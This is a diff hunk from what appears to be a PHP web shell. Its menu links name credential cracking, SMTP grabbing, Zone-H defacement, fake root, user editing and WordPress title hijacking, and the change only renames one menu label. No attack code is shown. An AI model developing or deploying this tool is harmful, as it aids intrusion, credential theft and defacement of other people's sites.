@@ -374,7 +374,7 @@ echo "<li>[ <a href='?dir=$dir&do=cpanel'>CPanel Crack</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=smtp'>SMTP Grabber</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=zoneh'>Zone-H</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=network'>Network</a> ]</li>";
-echo "<li>[ <a href='?dir=$dir&do=adminer'>Adminer</a> ]</li><br>";
+echo "<li>[ <a href='?dir=$dir&do=adminer'>Adminer DB</a> ]</li><br>";
 echo "<li>[ <a href='?dir=$dir&do=fake_root'>Fake Root</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=auto_edit_user'>Auto Edit User</a> ]</li>";
 echo "<li>[ <a href='?dir=$dir&do=auto_wp'>Auto Edit Title WordPress</a> ]</li>";
